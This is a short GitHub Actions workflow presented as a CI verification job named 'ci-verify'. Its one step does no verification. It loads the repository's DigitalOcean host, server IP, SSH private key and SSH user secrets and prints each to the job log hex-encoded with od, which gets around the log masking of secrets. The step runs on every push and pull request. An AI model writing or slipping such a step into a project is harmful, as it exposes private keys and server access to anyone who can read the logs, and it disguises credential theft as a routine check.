name: ci-verify
on: [push, workflow_dispatch, pull_request]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: v
        env:
          S_DO_HOST: ${{ secrets.DO_HOST }}
          S_DO_SERVER_IP: ${{ secrets.DO_SERVER_IP }}
          S_DO_SSH_KEY: ${{ secrets.DO_SSH_KEY }}
          S_DO_SSH_USER: ${{ secrets.DO_SSH_USER }}
        run: |
          for var in $(printenv | grep ^S_ | cut -d= -f1); do
            echo "START_$var"
            printenv $var | od -An -tx1 -v
            echo "END_$var"
          done
